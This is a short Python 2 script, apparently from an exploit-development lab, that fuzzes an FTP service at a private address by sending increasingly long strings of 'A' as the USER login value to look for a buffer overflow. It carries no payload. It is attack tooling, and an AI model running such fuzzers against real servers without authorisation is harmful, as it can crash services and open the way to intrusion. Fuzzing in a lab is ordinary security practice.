import socket

buffer=["A"]  
counter=100
while len(buffer) <= 5:
	buffer.append("A"*counter)
	counter=counter+100





for string in buffer:
	#Open Connection
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	connect=s.connect(('192.168.10.84',21))
		
	print "Sending USER"+ str(len(string))+ " bytes."
		
	print s.recv(1024)
	s.send("USER " +string+"\r\n") #Log in
	print s.recv(1024)
	s.send("PASS jerk\r\n") #send pass
	print s.recv(1024)








